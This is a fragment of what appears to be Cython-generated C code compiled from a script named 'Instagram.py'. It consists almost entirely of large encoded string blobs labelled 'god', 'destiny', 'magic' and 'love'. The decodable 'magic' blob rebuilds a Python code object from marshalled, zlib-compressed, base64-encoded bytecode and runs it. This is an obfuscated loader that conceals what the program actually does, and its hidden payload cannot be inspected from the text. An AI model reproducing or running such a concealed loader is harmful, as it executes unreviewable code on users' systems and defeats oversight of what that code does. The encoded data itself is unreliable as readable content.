jnP9uLmt4ISA1qUMKEzW4MwyfMxADDKcZpKOOAzIMBUOJqQIGqJgCI2SJray6HzqfI2gOIKEeGRgLrxMGp0I1IJWwoxWzHJM0nyMxJx5RHIb0BKZ3IH8eY0b2FJWKEIcyLyR0nGyQBJceExucA1OaZ0AbZ3EWozAGDx81JGNmn1ugq2yBBKOSLaS5FwAVM1E1IISHqIqEIUIMnmMCLwIwoaSkITy6p0kmomAjISEnFzV2pR9doUM1ITEzFwuvETc6M0kiMz1DHJIGMR9eFvfiEKcDBRkuGScWGxSJZxA3qTWvBKOVGHVlpT1LFRSRqRcMIKIUA0SeA1WKEJj0AxShA0AIF000ZTuHBJqwnTVkqRuDF0IhLJS3LaucFSOKEz5uE2g6JF80AGExo1WjAacRAH9xoTMxn1EzqSSHMaEMITMmq1EzqGIFY3cAY2H3DJS0Fwp5GGOBJHuxAGMaJwAzEaEeBRqFYmuwGzLmA1yYEyqlBJ12IHIVFTghGmVmrIW6Z0SFETj3EzuLnQM3oxIlBII0ImMdAGywGzMIGQS1pSE6MRbiJJ9hBIATFF9FH2kzp0x0H2ySFTEeZ3cTMGuAZGIBMRp5G3ATpaOYG1u6MTkPZwOuFUcLpablE0MfnyZ2ZwIXFQNiZ2SyIJgVMxSUoatmITV2G0'             # <<<<<<<<<<<<<<
 * god = 'RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMGkrWlFWYVlzUlp4cXR4WjJma2ZVdll2QW9Pb1BvNEt5RGZoQ2RRK2djZHZUTUl4aXpWOC9MWS9xUzNMQWlRK3FtUG96T0MrZ2NSV2VFVHdVNTZ6NDBVV1pHbkVVaFBZRlNFK2lzb0lPVFBVUm9hVzNaSEpEbksvbVNqUE5Za0oydTRUcFZGczVLSVVvcnNvOEw0TnlkdGxZeHRDZ3RucHI5VFZJZ2dTaXRjcHA5amZjdkswaEJvN1FLWlBZMjNxWGxyYWorSXQ1c2xhOVhnUG5MdExBcXAzMmc2dGJFRXhCOFRWdFJERXdJUkd2aWpJNUtMYzBZNmppMXJhUDJxL2VqZzN4SVI4dHdQVWtjbnRKTlM4bmo0TjNrM2hObXV6YzllV0V0MmhCeXZoVFZlMUgvajcrbWxpczVJTjRMYTlnZUY4MHVKNDYxb0hlV0tXWW42TFJ5dmFRYjgzd0pyNTJJNTB1N1JlU0MrajVlN0MvenNzNlkzVlQvSzBvSjJ0YWFFQndmTjVQZUR1UE9FOHJEdzdMM2pqdGJPVExTZExyUG1hSGpzM1pJUzNYa21EUkxwNTl3ZUR6eWNWb2NhMlQwdU54QUZKM1BDZEwwNFN1Q1BYMUkwM24zMFRubjBIK2MzYU4xUEpwYzFPZVEzcmRtTWlXN0cyWXllSm0zT3gxY3h1Z3VYZUowWVNhelFoMEtWL1F5R1ZvVDVjRjUxUUJWT1pQUk0xeDdVSXlWV2xDOXI1V05NdGNhUWk3NXR4V0NCYjdTWnEraUVjRzNPZnlDSzJndDBWa3FnN05xWjYyekpTMEZ3TllhTEwzQ1dkdmpZYlpvb3o2QVJmc2RwUEEzckRXNUdmR1lpRE9VdmFRYnZBUzZ3QkN0NzB5SnVQcXo3OGYrdHpwanB5RWtTU3MrY0NWTjBTcVY5RmxNK3VXdTVqVmZpYW83UXVHZjFoM2g4RS9jSS82VDRXaFUzTzBuaVg0OFBxczdKUCtuZFlmUC8zUDNpUDU4T0JDbDFUaFpjczloY1ZnSy9wL2dwOEVRSFA2WUQxUEdlZDNERXRYdFl6cFRqNjB6Q1JKZ1RzMFFESEZMd3JuY2JSajdtSzhQTlIrZjRXZCtheldGbXhRRmFBMk1Wci9JdkNpQ3ZONHliNDJ1QmZRWjFLYWM5Wm9XYTgwTS9USHZlTWhhTjBGM3FFTE1lZUdMS3MybnhrL2dHcFFuTnpSYzh1VFhadVdISE1KdjhKUWoxamdkVzIxbDdjaklXUWZvYzNHampYV3lMdEM5MmtHSDZ3WjlyZ2UwclE3dzkvWUxrTi9vWmdBaytxcW9aMGhzRDYxNEJWaC9QNjJEUVJwN3JhdDlkT1YvNUtkeHRXVjNtVWMrTE1YZGUzZFBHeTFRWDExT2ZlMG5QeS8vb0NjODZBay9RQ082VEtYcDVucXFSL0tnSy9rb1JIZDczUEVkTklQZWpjOUFWd21TQ2RodU5SK3BCaHQwbGVDWGc1WUpHUGpJQkd6b3hpZVgvcXBkK09RM2Z1OERZY2RQR093TzdwMzI0TDRUa1YrcDVIUEtpalhnZnRKamorQTdYZmFkNjhwYVdjc3JPVG1WSktzVW1oWTJ3L0tyRlZYZmtFK2FGNTg4TDhOWFVSSkdzV1Q1enREMDZYMWpiakduRnBqS2h1OWlRblBtQzhPNlVsakw4SW5NNVBqazdQVGs5R3hxY21JbWRTSTVNenM1bkMxV0NzYmNkSklUbCtVNjlvTDJLYXBlM2duZ0tKeW9pUXJSbVZvWVEzRTFhY2YzMHR4cFRsNlEyT3pFNUZ0cVRpMHJHaHIvN1BUS0YzRzdBWTNndDNGdlFyNmtGT1NUTzBHWkp4ZXlySUZHK3ZpWXNJRnBoM0NDQjgwNGZPQncwTTg0QThzSloraVlwZEtCN0xMS0J5aDNiTXJXRDFBME5sMXpCcG1YYkJDbFFZWkEzcDN2SWRqbFdKMjBaM2tvMkdOT2tiVG5nVG96OWwxblBjbkNiNjl4aGpzVzJGTlFTY3ZPdzdIUEFMY1I1YjhDem44aWxCZHcxcWRiSEVYY0V2MVNETTdIQWQxVGlPQ2YrbjFQUlVRNndwOGVrK0wybXY5WEdsRXU0RVc1YmtTNUgrQnFsWUdyNEpJaDBZb0wrdjNrRDVBTlFCRHhESkRQajJ2ckxMUW1nUjRSb1B1U2hYclNoN1pCZGFUT0lEcTBHbVpSZkl0WkMyQlF4SWl5R0dzRmJHa0IzSWtEQnJVQkJzWEEzdzZvMGRFdmJJcEc2eTRsNmVRbHdRMEQ3dm82djlxS3N5RHIzZ1pFNjBPMGJDWDVvSVdDV0lKZWtPc2poTnJ6eEZMMEV4SWUzdlNCeEFDWmlFcHNMOGkxVlgwVzd1MEhIK1hQUkFzQld4Ky9aeUhmYnhtdFVLL3R6dE1Na3A4L3pRRlB1TThUTGhzZGlHK1VOOGM5d1NNNTVFcGF1TmRaaDN0ZEQ4V05pRFZMMDc5ckN3V2J6ZEpZeUdmTjA2QkZRRE9rQzNGeWJxM0FpemJPNldnM3BOOGxpY1NaVEVhWm0yZ0tNQ0VBdGRMSzNSd0JDeVIyUTBHRmlDQ2xKbWIwcjJQb2kwOVpOZmRPVWRja2pabDdyT2xwcmJDTXNJajROa0V2by80dVp2d1FuZmZRK1YxMHZtbkRsLzQrNXRiTlVjc0ZySGtOQ3ZSN2VQLzNFVEc2bTRMUytUcGtlZ29hVFhPZ1UwczVKYXZ1amswQkczVnN6UEZhYk5rc2NzRUZIZXZhRFhKdHZ6eFNyckZYSStoOEZaeS9SQXk0U0tCemxKYTNVOUpOQUp4ajRyNW5vVjhPMkRnR1JsOXRCQnZzUG50c3NCbjIwVFQwMkM4QU40bi9YK0FtSXBqL2xFclJCN0o3Q0JiNm4xaVNBWUtjUllLY3ZSYms3TE1nWnovRkgyd0tPUTMzT09SWU9mdllnV2ZPK1REUXhzYWMvVTdxL3NkeWZ1eWVCWGIvNXU3WEcrQk85c0Rhd1YzZ2Jvamc3dEF1Y0hkNE43Z3JSQzJ3RzdNbmMrNlcxb1c3ZHlHMEcwTHoxcVR3MzFKNUhNT3JIc2o3ZHdGK0EwK0IzMEFEL0FhK0hMRGdGM3dFdjBlYXdxLytJVHE3UWEvK0VUcE5ZRmQvaEE1TlRmMERkSWpCL1NFNkNMaTM5UzMwYmdzNEFXTkJLZG9sbmJHcDRoT0FOQzJWMWx3dzFiK0Zqb3VkdmI4YzdOVC9TTmlGMHlGZHFuVmNWVGNXaTRyT3JnQWgxdlZLeWVCNEdyU0luZnRic0pjQmJWUjBsWEJYQzA5NlZIVlhXN2VsUExaRWpvN3ZJbkVqeEQ0QTUyZUlmTDhsb1BidVFxd0VQNFRaQVF0c240ZmJIUVZ1NThjMXdSL0hXMzhoa0g3UUNOSjFldTg0TXNJZi9UL1VlMy85ZWZYZXJSYld6anEyMGVvb1ZxZi90cTdHV1NmcHYxMEFoRzFHdTJYOVNUb3ZBR0VmQUdFbitBR21iUjJXdGNLeGwydXdVSllwMEluYmdkZHhuWGdRNG5hQmhndmd5bVE0RGhJUURubENEdFhweHJHbnkxcmcrVGJveURHbzIyNm5iZytUbnovckVVOTQwQk0rYlBTQSswS2RqdXhLSG5VbExiRHFyZU9LZlFCV3ZiOFVMWG5raHY3YjJOMS94NGFVcHRqMWR4M3Nlc2ZCcm04NFVFYnFjTVNhRGdZR1JnYW9xS3FZTCt5dUdhdjNTN21pcmlZZ3FKellIZjd1SVV6NFFIZE9oOHY4RXc3bGREeW5vTGxueHJKQ1NnZnpLdE9Vc2d0eTZRQ0ZjTmgwbWFPai9YTEUrM3YxaUxmSFZXMzFEOUQ1KytnOFVhM1YvOENCdUwrNVp1dGFSZG9rTU9td1IzdUhRZEpGTnI1UkFEUmJSNFcxR0tRSEp5MGJod1diaXRwcEpiMG1selliZlV5emZSc2M2R1ROTmR2VDRrWHhKSVE4bjJicjROamJqVGdXOU9MWVg2RWQ1dmVlbFdwV29iL2ZFL1IvaGJqWFZEcHNTU1BlK0lIK1JRQnZDT1dJQWdicU5NNGdJaGxyQWRwNjJ3aFpKQUJ0dzJNV0NVQi9heDF0amJBNFlWOEthYURSc2hWRDIwMUVYc0MwVnRaaGtiTk93Sjg0Mm1zaXBoSEo3U0xiZGRMbmdLS0ZDWFVDdTBsd0ZMajdlU01BZGRMbVBHVTMrZmxUOW5qQ2ZaN3dYaUkrZlhXMHlKWGM0MHBhU05QaHNYWGZyUWI2RzJ6ZE96ZCs2bENuM2VJOEMzVWFhRXFkQUZ2bWkzbEZLMWk2NjRqUGpMNjhqT3NEaUNUZzMxQldpa1h5eDE1ZUtSck9uWkMxNTRvdmszM2RBU3lIZTJuLzAyZmhsL1lYdmpxYVZLOXFObUNGT2U0VVNIWUxNaXE3QlFHL3B5QWpYVTF4eEFXT0JsNUZzTktBUnE3MWRUTUlDYm9RNHN4cjFaTWNCeHRjZXNTQkJpZkh2T3FtcTdvNk1KTjBaOXJjRFUrUDRjWFhzQ0NJRjY4SVhDa05pL1BFbW1JU3Jta01QWmRhT3V6T2duMnRFU3Z3RDQzanNjTEt1SzZtQ3ZodHB6UnhucmVGdEEvdG9lRHNaNEZiVURYNjM4RUVSRTlrWEREdHRNRm15Uy9BQzFnVk1zSXl2SFlaa1Z6SlBHNzR0dnpid3J0SEVTcTJBdmdKcWszSDFPcmRPQkFkMzFhb0txM1NpL3VZV2MreFJnUGx1cnV6RFVZL0tYaUZJaHQzcmNtZ'
 * destiny = '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'
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_love, __pyx_n_s_CX21THHIcX3AzrQIeX2MaDzM4nRH0pSy) < 0) __PYX_ERR(0, 4, __pyx_L1_error)

  /* "Instagram.py":5
 * magic = 'Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBlKF8uX19jb2RlX18pO18uX19jb2RlX189Y29kZSgwLDAsMCwwLDEwLDY0LGInelx4MTZlXHgwMGVceDAxZFx4MDBceDgzXHgwMVx4YTBceDAyZVx4MDFkXHgwMVx4ODNceDAxXHhhMFx4MDNlXHgwMWRceDAyXHg4M1x4MDFceGEwXHgwNGRceDAzXHhhMVx4MDFceGExXHgwMVx4YTFceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwZFx4MDRTXHgwMFx4MDRceDAwZVx4MDV5L1x4MDFceDAwWlx4MDZceDAxXHgwMHpccmVceDA3ZVx4MDhlXHgwNlx4ODNceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwWVx4MDBkXHgwNFpceDA2W1x4MDZkXHgwNFNceDAwZFx4MDRaXHgwNltceDA2d1x4MDF3XHgwMCcsKCdtYXJzaGFsJywgJ3psaWInLCAnYmFzZTY0JywgYidlSnpWZkd0d0hOZVZYbmZQZXpBWXZBRUNKTUVtU0VJRUJXQUdBNEFFU0lFVVNmQWxQa0NKbEdtTjVSMDM1amFBQnViRm5oNkM2QjE0WlZQT1BoeFoxRnJaVlZaaUZ2QzZVdEZXS3J1Vi9IRTUreU5KMVZaUytaR2tVdjZSbWtwVkVqdVZqV3AvMkZWWkp6YThsbkxPdWYyYTRZQVByNzJwWU5DM2I5OCs5OUgzM3Y3dWQrNDl0MzhnTlB6NTRYZ1pqdisxRnh3bU1ERW5wQVZWVklVdGlVbmI0Z05SaExCYlF1UmozeWNvZnFQODN4Y0Y0UWU3cFZMK0g2S2JDcDNGdEVobktTM1IyWmYyMGRtZjl0TTVrQTdRT1pnTzBqbVVEc0ZaeW9YemtYUkV4RFI4dVdpK0pkMUNmbjh1bG8rbFk2SVFFVmdnM2NxQzZUZ0xwZHRZT04zT0l1a09GazEzc3BaMEY0dWx1MW5yVnMreW9MWjlLTHduc3ZoN291VnJBMTgzK2RvZFg0Zmo2d1JmTy9tNm5MQnVKNnpIU2FYVHVkdnJoSFU3WVgzUEtMZm5HZVg2bjdGOEErK0oyMks2bCsxTjk3RjliUC9iUW5vUEcyUUg0TnpQWkhZUXpnTnNpQjJDODE1Mm1CMkI4ejQyekY2QTgzNTJsSTNBZVpBZFl5L0MrUUFiWldOd2xpOEpiSndsM2haWTRvR1VQc2lTYkFKQ2g3QkhqS1I0aHhnUmE1MjNWM1JWWVRlTHhkeUYrMnEyWWhSMUNHMDdYeXdVMUt5aEZRc1hkSjJDd3FXY1lpd1Y5YndaMnZ1RmlWT3pTZHN6WVh0U3RtZlM5a3pabm1uYmM5ejJuTWpYQlBPSW5NbGtQSWNzMjE0WnZGWkExQnl1d3NXYi9NaFVaZm5OaEN4WDRYWlY1ajhlUUhKeUJyeHlBdTdCalRjVDRQQi9Ma3NCS0plaG9NeWJrQmY2NlFLOGVKMndBNkk3NGhkMnhFTTc0aGNyWDRESyt2NWI3LytLL3FNMThaalpJWit0R0N0RlhUNHB2MVkwVjVTMXFMbEh2cWhrMWNWaWNRMENYOVlwZFB6K2hoazFCK1VyaGJLaExPdEszcjJWS1M0dGFWbE55VVVyNlY5cGVaVUJBSXJyUlZQTDVaVEU5SGhTUG5wTksxVHVuNUxQRnBoZTFKaDhmRHg1U3I3OCt0azdGNjdJbjd0eGEremE1SVI4cnFMbFdJSUhXbUduNVBWN0kvTFpVaW1uM2xFWHIycEdZbnJ5eFBqa2Nmbm8xY3UzcjE4YmxYUGFtaXBmVXJOcnhSSDVjNnBlaHQ2WW1JTDh6cS9veGJ5YU9BNTVqMDlPcHFiSEo1S3o4dlhpb3BaVDVWdktrcUpyZGtwdU5jRjFFbjZwaWZIWkUwNUJqNlltRTFUWXFaa2tLMm1uNUlua1RQTCt4TXhFeWk1LzQzUEE5UjMwWGo0bHIyakhVOU1RdDJSa2J0NCtKYy9PcEdabVVsT3BrYXdYWEVOd3RNSnhIZ0gyZzdBZ1BQU1pQektFTFpIQjZ5NEtobVQ0UGhRZWtJOUpXLzVsZ016M1JDTkFrT0FIWDVCOEFTY3M2SVNGbXNpRm04aEZtc2hGbThpMU5KR0xOWkZyclpNTDJSRHRrUXZaWU0ySElDTnNSRDRFK01mNHJKMzhRZkozR0ZGd094OUZINGliUWxWZ1hmZUVoNkwrWnc5RlU2cXJqWlltdGRIU1VLcnVKbkxoSm5JOVRlU2lUZVI2NitSQ1RtMjBORHhsMzNNOXBWZ1ZyYWNjZ3BaMzVmZDQ1UHNmaFNtOTJGWXJHNkErZ3IxbEwvbmlEd1JSS0dRaGxYMlV5b1huVEdXL0o1VjVTR1dRVWxsNXpsUU9lRkk1QXFuSWxNcGRvNDFDWkNOT2NmMVlRNUJha0ZKRC8wR2UyaDM0TWVIV1U4OSt3V2gvS0c3OGMxSFlsRVRCSE5nMTNjNnE5S0h3S01MVGZnUGlia3BmbG5nYTNMOHVybVAvd2pxVDlLbTZ2aFZ0NkF0RFRwamJGdzdWeVVYSWQ3aUozSkZuVEcvNEdlVmVhSkx2MFNaeUkwNGZwRGJoVHc3UGk2M3IwLzlrMTU1NXpOTXpmVVpIMWZkQVpDK3VTVkJIUzd2VzlhamRocGlIMGJuVnRRMXQvKzcwcHIvcU03b2ZDR3pzSTJrelVQV3Y5ckR4YW9BbDNwRzJlcmVGelNCTFZvTnNvbCtnRm5oLzE5UlRQUFdIWWlIQUpvMCtpRFBWRCtoSXNmN0pyckdtZWF6Q1g3TGpkWEY4K29QbnhwRVQ3NG1Rd2t5L3NMVm5XNkNRWmpHYkljc3N4VHpadjN1c1pqaHppbUpCaWJmNm41QmZyRW5NbHlqbXhGTml4cHZFbkhONlV5ZWxjZm9KWlQ3VEpQN0xEdnJ4K0dmZCtGWS9IR0RuMlBrSDB0YmVxbS9ieG85NTh1MGpqT2g5d3JzY1pCZnNaN0xmYVFaWTRCY2UrQ0JtYkFMYXRmenRkUWpIM3h0T2YzZDZ2VXd0L3ozQU5KNUR4Sk1EK2k4MnhiUkwyNCsvUDVjcHBmL2lEWDA2dGxuSXRmK2hmeVBHeTdocm5Dczh6aHQybkVHSU05d1FKK3FKZy81WEd1SzBRNXlyRmtMMlB4OUMxdVBqeU5VYnRVQTJweXE2SGdDdVVoT2plcERPRXpxd0ZzSHNsbDh2QVpGaXFueFZsVy9xYWw2cjVJRzRwb0M0emlzbHhWaFRDa0RsZ0xCdFFPaWsyUzVmVjhxVnVzQXBNeWEvcHBhS3VnRmtjQmtDcG5mQ2tGaXVvdWhBdGMvc1JJRFhGWXRsVlQ2NUk4b2ZTM29Nc2sxTHlRbXpSNzZzNk11S1BGOVJJR1lPMHB4S0FqM3V0b0p2cXZvaWhVNWlhQnRlNTdYQzhuSUYyTnhhRkpLOXF1WVhsWndHbVJ3MER5SDNVK1N6V0xKNVRkR1ZGZlRCSTkxWlVZeXlVaXFOajQ5LzRzTUhYcm5QbHNlS0piVWdyeGhHcVh3eWtWaFh4cEYxcG1ZbVo2Wk96S1ltZ0RTZU1kVDd4dHc1cGJCOEpKVThwK1kwT0YzVHltcWhqTDd6dXBKZGc3UERRc0gvQnBlRlo4RVlXRzU0MUZiK3FDbFQrNVZtZWtzeEtwNWM0enpYU1hQMWJ5UFg2OVFta0cwYnozWnFKeWJmMFl1RlpTRHBwWXFoUjdEU0QvRG1nWWF0bEtHekxPdGEyZENWc2dadEpZT09JSnN2MmlYa09zL3NlREtaWEZjWFY0cVFMVFJldHBoUDZPb3l4RkwxaEhuWTZZUTNsTHd5S2wvSUsxcHVGUHByUWI2cGxNdnJSWjJOUjgwVDhpdmFtaUxmcWpCbFJiNEtPb2Q4UzFzdXlKV1NmRTNKVlZEeDBKWkFBQXBCOGFtRTBFdWk1bFhzV1JXbVlTZkhVbHY5REh2VGJlaURsZnZnTXlDNTBnWW9kZ1Y2YWNaTEd6eDdMYWV0eURlS2VWRDRzSDVrcy9QeDF3czZLNVdBQy9QT2puVXFYNFZjSUpIclN1VmcxSXhZYjVoOFVnZTFUTmlKeTYrQURIYnFZaGxxOTJPcDVvTzdhUjlUNyswOFErMWxWMERmR2krdGxENFdhOEVTdkNENThrNTdtZXBtVFdFS3ZxMWxwUmJHT1FQc0VEdWRkdlpYM2JzQlF3YzF0QmFvbEpWbGRXY2Mza2hzK29JaTM4WncrYmJHbERYNW5GWlc1T3R3UjFrcnEyWDVvbVpVZE9nS1dpMVVzaDQvVE0wR0NtN2FYd0FQUENsdkFBZ0lxT2d6by9JdEEycXZERUZtaTN4TzFYUEtXZ1V2WW5peHJDeFdvTFpPMXZ5clJhMVFFNCticlo1U3lpZlRJZlYrU2ROVnR0TTJyeGhLZ2ovSXVISGZxSW5ybitDMFdNMlhMeTgvQlRQT0VtYVloNS9sSFlMZTM4NTcvL1JPbTExeFZ3cjNvRDBaTk56VllrRmR3MzVHVXk0SGFsS3hYQXVXTjZBejUydUJrcTRWakZvNGs4a1ZsNHVaakg2TTBQbGNUYnhaRTYvWEFocStSRFh4Y2syOFdoTmZyL2tOTGEvV0F1V2NxcFpxZnZXK1p0U2ltWXhDT1dZeXRjaUYrMW0xaE5NN05WOU9MV0I3M3Eyb1phTmNDOTFTeTZobzYvejVsMVVEcXErTWN2QW0xcUpaU01LQTRwcVF1S0VaT2JYbXg0ZXVCZFoxelZDeGVIbTFVSUVjd2xmVkRYb09IZEYwSkpUdVdNQy9aSkl'
